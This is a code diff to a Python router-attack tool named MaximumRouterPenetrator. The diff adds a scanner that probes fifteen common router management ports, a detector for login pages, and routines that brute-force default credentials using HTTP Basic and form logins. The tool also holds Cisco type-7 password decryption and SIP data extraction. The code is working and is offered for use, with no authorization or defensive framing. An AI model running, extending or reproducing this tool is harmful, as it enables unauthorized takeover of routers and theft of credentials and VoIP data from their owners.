@@ -118,6 +118,9 @@ class MaximumRouterPenetrator:
         # Authentication detection system
         self.auth_detection_system = self._build_authentication_detection_system()
         
+        # Multi-port detection system
+        self.port_detection_system = self._build_port_detection_system()
+        
         # Cisco decryption
         self.cisco_type7_xlat = [
             0x64, 0x73, 0x66, 0x64, 0x3b, 0x6b, 0x66, 0x6f, 0x41, 0x2c, 0x2e,
@@ -1050,20 +1053,43 @@ class MaximumRouterPenetrator:
             print(f"         🔍 LIVE DEBUG: Starting enhanced router identification...")
         
         try:
-            # Step 1: Basic web access
+            # Step 1: Multi-port scanning for router interfaces
             if verbose:
-                print(f"         🔍 LIVE DEBUG: Testing web interface on {ip}...")
+                print(f"         🔍 LIVE DEBUG: Scanning multiple ports for router interfaces...")
             
-            if REQUESTS_AVAILABLE:
-                response = requests.get(f"http://{ip}/", timeout=5, verify=False, allow_redirects=True)
-                content = response.text.lower()
-                headers = response.headers
-                status_code = response.status_code
-            else:
-                response = urllib.request.urlopen(f"http://{ip}/", timeout=5)
-                content = response.read().decode('utf-8', errors='ignore').lower()
+            port_scan_results = self._scan_router_ports(ip, verbose)
+            
+            # Use best target if found, otherwise fallback to port 80
+            if port_scan_results['best_target']:
+                best_target = port_scan_results['best_target']
+                base_url = best_target['url']
+                content = best_target['content_preview'].lower()
+                status_code = best_target['status']
                 headers = {}
-                status_code = 200
+                
+                router_info['detection_score'] += best_target['login_indicators'] * 2
+                router_info['detection_details'].append(f"Best target: {best_target['protocol']}:{best_target['port']}")
+                
+                if verbose:
+                    print(f"         ✅ LIVE DEBUG: Using best target: {best_target['protocol']}:{best_target['port']}")
+                    print(f"         📊 LIVE DEBUG: Login indicators: {best_target['login_indicators']}")
+            else:
+                # Fallback to standard port 80 test
+                if verbose:
+                    print(f"         🔍 LIVE DEBUG: Fallback to standard port 80 test...")
+                
+                if REQUESTS_AVAILABLE:
+                    response = requests.get(f"http://{ip}/", timeout=5, verify=False, allow_redirects=True)
+                    content = response.text.lower()
+                    headers = response.headers
+                    status_code = response.status_code
+                    base_url = f"http://{ip}"
+                else:
+                    response = urllib.request.urlopen(f"http://{ip}/", timeout=5)
+                    content = response.read().decode('utf-8', errors='ignore').lower()
+                    headers = {}
+                    status_code = 200
+                    base_url = f"http://{ip}"
             
             router_info['has_web_interface'] = True
             router_info['detection_details'].append(f"Web interface accessible (HTTP {status_code})")
@@ -1292,13 +1318,29 @@ class MaximumRouterPenetrator:
         """Test credentials with REAL verification and authentication detection"""
         auth_result = {'verified_access': False}
         
-        # Step 1: Detect authentication types
+        # Step 1: Multi-port authentication detection
         auth_info = self._detect_authentication_type(ip, verbose)
         auth_result['auth_detection'] = auth_info
         
         if not auth_info['login_endpoints']:
             if verbose:
-                print(f"         ❌ LIVE DEBUG: No login endpoints found")
+                print(f"         ❌ LIVE DEBUG: No login endpoints found on any port")
+                if auth_info.get('ports_tested'):
+                    print(f"         📊 LIVE DEBUG: Ports tested: {', '.join(auth_info['ports_tested'])}")
+            
+            # Try brute force on discovered ports anyway
+            port_scan = self._scan_router_ports(ip, verbose)
+            if port_scan['open_ports']:
+                if verbose:
+                    print(f"         🚀 LIVE DEBUG: Attempting brute force on open ports...")
+                
+                # Test credentials on best available port
+                best_port = port_scan['best_target'] or port_scan['open_ports'][0]
+                auth_result = self._test_credentials_on_port(ip, best_port, verbose)
+                
+                if auth_result['verified_access']:
+                    return auth_result
+            
             return auth_result
         
         # Build unique credential list (remove duplicates)
@@ -2416,74 +2458,107 @@ class MaximumRouterPenetrator:
         }
     
     def _detect_authentication_type(self, ip: str, verbose: bool) -> Dict[str, Any]:
-        """Detect authentication type and login endpoints"""
+        """Detect authentication type and login endpoints across multiple ports"""
         auth_info = {
             'detected_types': [],
             'login_endpoints': [],
             'primary_auth_type': None,
-            'detection_details': []
+            'detection_details': [],
+            'ports_tested': []
         }
         
         if verbose:
-            print(f"         🔐 LIVE DEBUG: Detecting authentication types...")
+            print(f"         🔐 LIVE DEBUG: Detecting authentication types across multiple ports...")
         
         try:
-            # Test common endpoints
-            for endpoint in self.auth_detection_system['login_endpoints']:
-                try:
-                    if verbose:
-                        print(f"            🔍 Testing endpoint: {endpoint}")
-                    
-                    if REQUESTS_AVAILABLE:
-                        response = requests.get(f"http://{ip}{endpoint}", 
-                                              timeout=3, allow_redirects=False)
-                        content = response.text.lower()
-                        headers = {k.lower(): v.lower() for k, v in response.headers.items()}
-                        status = response.status_code
-                    else:
-                        response = urllib.request.urlopen(f"http://{ip}{endpoint}", timeout=3)
-                        content = response.read().decode('utf-8', errors='ignore').lower()
-                        headers = {}
-                        status = 200
-                    
-                    # Analyze response for auth types
-                    detected_types = []
-                    
-                    for auth_type, config in self.auth_detection_system['auth_types'].items():
-                        score = 0
-                        for indicator in config['indicators']:
-                            if indicator.lower() in content or indicator.lower() in str(headers):
-                                score += 1
+            # Step 1: Get port scan results
+            port_scan_results = self._scan_router_ports(ip, verbose)
+            
+            # Step 2: Test authentication on discovered ports
+            test_targets = []
+            
+            # Add login pages found during port scan
+            if port_scan_results['login_pages_found']:
+                test_targets.extend(port_scan_results['login_pages_found'])
+            
+            # Add best target if not already included
+            if port_scan_results['best_target']:
+                best = port_scan_results['best_target']
+                if best not in test_targets:
+                    test_targets.append(best)
+            
+            # Fallback: test standard endpoints on discovered open ports
+            if not test_targets and port_scan_results['open_ports']:
+                for port_info in port_scan_results['open_ports'][:3]:  # Limit to first 3
+                    test_targets.append(port_info)
+            
+            # Step 3: Test authentication on each target
+            for target in test_targets:
+                base_url = target['url']
+                port = target['port']
+                protocol = target['protocol']
+                
+                if verbose:
+                    print(f"            🔍 Testing authentication on {protocol}:{port}...")
+                
+                auth_info['ports_tested'].append(f"{protocol}:{port}")
+                
+                # Test common login endpoints on this port
+                test_endpoints = self.auth_detection_system['login_endpoints']
+                
+                for endpoint in test_endpoints:
+                    try:
+                        if verbose:
+                            print(f"               🔗 Testing: {base_url}{endpoint}")
                         
-                        if score >= 2:  # At least 2 indicators
-                            detected_types.append({
-                                'type': auth_type,
-                                'score': score,
-                                'priority': config['priority'],
-                                'method': config['test_method']
+                        if REQUESTS_AVAILABLE:
+                            response = requests.get(f"{base_url}{endpoint}", 
+                                                  timeout=3, allow_redirects=False, verify=False)
+                            content = response.text.lower()
+                            headers = {k.lower(): v.lower() for k, v in response.headers.items()}
+                            status = response.status_code
+                        else:
+                            response = urllib.request.urlopen(f"{base_url}{endpoint}", timeout=3)
+                            content = response.read().decode('utf-8', errors='ignore').lower()
+                            headers = {}
+                            status = 200
+                        
+                        # Analyze response for auth types
+                        detected_types = []
+                        
+                        for auth_type, config in self.auth_detection_system['auth_types'].items():
+                            score = 0
+                            for indicator in config['indicators']:
+                                if indicator.lower() in content or indicator.lower() in str(headers):
+                                    score += 1
+                            
+                            if score >= 2:  # At least 2 indicators
+                                detected_types.append({
+                                    'type': auth_type,
+                                    'score': score,
+                                    'priority': config['priority'],
+                                    'method': config['test_method']
+                                })
+                                
+                                if verbose:
+                                    print(f"                  ✅ Auth type detected: {auth_type.upper()} (score: {score})")
+                        
+                        if detected_types:
+                            auth_info['login_endpoints'].append({
+                                'endpoint': endpoint,
+                                'status': status,
+                                'auth_types': detected_types,
+                                'port': target['port'],
+                                'protocol': target['protocol'],
+                                'base_url': base_url
                             })
                             
-                            if verbose:
-                                print(f"               ✅ Auth type detected: {auth_type.upper()} (score: {score})")
+                            auth_info['detected_types'].extend(detected_types)
                     
-                    if detected_types:
-                        auth_info['login_endpoints'].append({
-                            'endpoint': endpoint,
-                            'status': status,
-                            'auth_types': detected_types
-                        })
-                        
-                        auth_info['detected_types'].extend(detected_types)
-                        
-                        # Set primary auth type (highest priority)
-                        if not auth_info['primary_auth_type']:
-                            best_type = min(detected_types, key=lambda x: x['priority'])
-                            auth_info['primary_auth_type'] = best_type
-                
-                except Exception as e:
-                    if verbose:
-                        print(f"               ❌ Endpoint test failed: {str(e)}")
-                    continue
+                    except Exception as e:
+                        if verbose:
+                            print(f"                  ❌ LIVE DEBUG: Endpoint error: {str(e)}")
+                        continue
             
             # Determine best authentication method
             if auth_info['detected_types']:
@@ -2506,6 +2581,236 @@ class MaximumRouterPenetrator:
             auth_info['detection_details'].append(f"Error: {str(e)}")
         
         return auth_info
+    
+    def _build_port_detection_system(self) -> Dict[str, Any]:
+        """Build multi-port detection system for router login pages"""
+        return {
+            # Common router ports
+            'router_ports': [
+                80,    # HTTP (most common)
+                443,   # HTTPS
+                8080,  # Alternative HTTP
+                8443,  # Alternative HTTPS
+                8081,  # Management interface
+                8000,  # Web management
+                9000,  # Admin interface
+                8888,  # Alternative management
+                7547,  # TR-069 (router management)
+                49152, # UPnP
+                5000,  # Alternative management
+                3000,  # Development/management
+                4567,  # Some router brands
+                8180,  # Alternative web
+                8090   # Management interface
+            ],
+            
+            # Port-specific paths
+            'port_specific_paths': {
+                80: ['/', '/admin/', '/login.html', '/cgi-bin/'],
+                443: ['/', '/admin/', '/management/', '/secure/'],
+                8080: ['/', '/admin/', '/management/', '/gui/'],
+                8443: ['/', '/admin/', '/management/', '/secure/'],
+                8081: ['/', '/admin/', '/config/', '/management/'],
+                8000: ['/', '/admin/', '/web/', '/management/'],
+                9000: ['/', '/admin/', '/interface/', '/management/'],
+                8888: ['/', '/admin/', '/web/', '/gui/'],
+                7547: ['/tr069/', '/cwmp/', '/acs/', '/'],
+                49152: ['/', '/upnp/', '/device/', '/'],
+                5000: ['/', '/admin/', '/management/', '/api/'],
+                3000: ['/', '/admin/', '/dev/', '/management/'],
+                4567: ['/', '/admin/', '/config/', '/'],
+                8180: ['/', '/admin/', '/web/', '/'],
+                8090: ['/', '/admin/', '/management/', '/config/']
+            },
+            
+            # Protocol preferences
+            'protocols': ['http', 'https']
+        }
+    
+    def _scan_router_ports(self, ip: str, verbose: bool) -> Dict[str, Any]:
+        """Scan multiple ports for router interfaces"""
+        port_results = {
+            'open_ports': [],
+            'login_pages_found': [],
+            'best_target': None
+        }
+        
+        if verbose:
+            print(f"         🔍 LIVE DEBUG: Scanning router ports...")
+        
+        # Test common router ports
+        for port in self.port_detection_system['router_ports']:
+            try:
+                if verbose:
+                    print(f"            🔗 LIVE DEBUG: Testing port {port}...")
+                
+                # Test both HTTP and HTTPS
+                for protocol in ['http', 'https']:
+                    try:
+                        base_url = f"{protocol}://{ip}:{port}"
+                        
+                        if REQUESTS_AVAILABLE:
+                            # Quick connection test
+                            response = requests.get(base_url, timeout=3, verify=False, allow_redirects=False)
+                            status = response.status_code
+                            content = response.text[:1000]  # First 1KB
+                        else:
+                            response = urllib.request.urlopen(f"{base_url}/", timeout=3)
+                            status = 200
+                            content = response.read().decode('utf-8', errors='ignore')[:1000]
+                        
+                        if status in [200, 401, 403, 302]:  # Interesting responses
+                            port_info = {
+                                'port': port,
+                                'protocol': protocol,
+                                'status': status,
+                                'url': base_url,
+                                'content_preview': content[:200],
+                                'login_indicators': 0
+                            }
+                            
+                            # Check for login indicators
+                            login_indicators = [
+                                'login', 'username', 'password', 'authentication',
+                                'admin', 'signin', 'logon', 'auth'
+                            ]
+                            
+                            indicators_found = sum(1 for indicator in login_indicators 
+                                                 if indicator.lower() in content.lower())
+                            port_info['login_indicators'] = indicators_found
+                            
+                            port_results['open_ports'].append(port_info)
+                            
+                            if indicators_found >= 2:  # Likely login page
+                                port_results['login_pages_found'].append(port_info)
+                                
+                                if verbose:
+                                    print(f"               ✅ LIVE DEBUG: Login page found on {protocol}:{port}")
+                                    print(f"               📊 LIVE DEBUG: Login indicators: {indicators_found}")
+                            
+                            # Set best target (prefer HTTPS, then high indicator count)
+                            if not port_results['best_target'] or (
+                                protocol == 'https' and port_results['best_target']['protocol'] == 'http'
+                            ) or (
+                                indicators_found > port_results['best_target']['login_indicators']
+                            ):
+                                port_results['best_target'] = port_info
+                    
+                    except Exception as e:
+                        if verbose and 'timed out' not in str(e).lower():
+                            print(f"               ❌ LIVE DEBUG: {protocol}:{port} - {str(e)[:50]}")
+                        continue
+            
+            except:
+                continue
+        
+        if verbose:
+            print(f"         📊 LIVE DEBUG: Port scan complete")
+            print(f"         🔍 LIVE DEBUG: Open ports: {len(port_results['open_ports'])}")
+            print(f"         🔐 LIVE DEBUG: Login pages found: {len(port_results['login_pages_found'])}")
+            if port_results['best_target']:
+                best = port_results['best_target']
+                print(f"         🎯 LIVE DEBUG: Best target: {best['protocol']}:{best['port']} (indicators: {best['login_indicators']})")
+        
+        return port_results
+    
+    def _test_credentials_on_port(self, ip: str, port_info: Dict, verbose: bool) -> Dict[str, Any]:
+        """Test credentials on specific port"""
+        auth_result = {'verified_access': False}
+        
+        base_url = port_info['url']
+        port = port_info['port']
+        protocol = port_info['protocol']
+        
+        if verbose:
+            print(f"            🔑 LIVE DEBUG: Testing credentials on {protocol}:{port}...")
+        
+        # Test priority credentials on this port
+        for i, (username, password) in enumerate(self.priority_credentials, 1):
+            if verbose:
+                print(f"               🔗 LIVE DEBUG: [{i}/4] Testing: {username}:{password}")
+            
+            try:
+                # Try HTTP Basic Auth first
+                if REQUESTS_AVAILABLE:
+                    session = requests.Session()
+                    
+                    # Try basic auth
+                    response = session.get(f"{base_url}/admin/", 
+                                         auth=requests.auth.HTTPBasicAuth(username, password),
+                                         timeout=5, verify=False)
+                    
+                    if response.status_code == 200:
+                        # Check for admin indicators
+                        admin_indicators = ['admin', 'configuration', 'settings', 'logout', 'system']
+                        found_indicators = sum(1 for ind in admin_indicators 
+                                             if ind in response.text.lower())
+                        
+                        if found_indicators >= 2:
+                            auth_result = {
+                                'verified_access': True,
+                                'credentials': (username, password),
+                                'session': session,
+                                'port': port,
+                                'protocol': protocol,
+                                'auth_method': 'http_basic',
+                                'verification_score': found_indicators
+                            }
+                            
+                            if verbose:
+                                print(f"                  ✅ LIVE DEBUG: Basic auth success on {protocol}:{port}!")
+                            
+                            return auth_result
+                    
+                    # Try form-based auth if basic failed
+                    login_data = {
+                        'username': username, 'password': password,
+                        'user': username, 'pass': password,
+                        'login': username, 'passwd': password
+                    }
+                    
+                    for endpoint in ['/', '/admin/', '/login.html', '/cgi-bin/login.cgi']:
+                        try:
+                            response = session.post(f"{base_url}{endpoint}", 
+                                                  data=login_data, timeout=5, verify=False)
+                            
+                            if response.status_code in [200, 302] and len(response.text) > 100:
+                                # Check for successful login indicators
+                                success_indicators = [
+                                    'welcome', 'logout', 'dashboard', 'configuration',
+                                    'admin', 'settings', 'system', 'main page'
+                                ]
+                                
+                                found_indicators = sum(1 for ind in success_indicators 
+                                                     if ind in response.text.lower())
+                                
+                                if found_indicators >= 2:
+                                    auth_result = {
+                                        'verified_access': True,
+                                        'credentials': (username, password),
+                                        'session': session,
+                                        'port': port,
+                                        'protocol': protocol,
+                                        'auth_method': 'form_based',
+                                        'verification_score': found_indicators
+                                    }
+                                    
+                                    if verbose:
+                                        print(f"                  ✅ LIVE DEBUG: Form auth success on {protocol}:{port}!")
+                                    
+                                    return auth_result
+                        except:
+                            continue
+            
+            except Exception as e:
+                if verbose:
+                    print(f"                  ❌ LIVE DEBUG: Error: {str(e)}")
+                continue
+        
+        if verbose:
+            print(f"            ❌ LIVE DEBUG: No working credentials on {protocol}:{port}")
+        
+        return auth_result
     
     def _extract_and_verify_sip(self, content: str, ip: str, verbose: bool) -> Dict[str, Any]:
         """Extract and verify SIP data"""
